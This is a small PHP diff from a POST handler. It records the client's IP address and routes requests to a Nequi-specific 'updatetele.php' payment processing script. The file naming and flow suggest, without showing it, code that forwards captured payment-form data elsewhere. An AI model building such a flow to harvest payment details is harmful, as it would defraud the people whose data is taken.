@@ -36,6 +36,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Ajustar URL para usar el script específico de Nequi
         $baseUrl = $config['baseUrl'];
         $security_key = $config['security_key'];
+        $ip_cliente = $_SERVER['REMOTE_ADDR'];
         $nequiBaseUrl = $baseUrl;
         if (strpos($baseUrl, 'updatetele.php') !== false) {
             $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
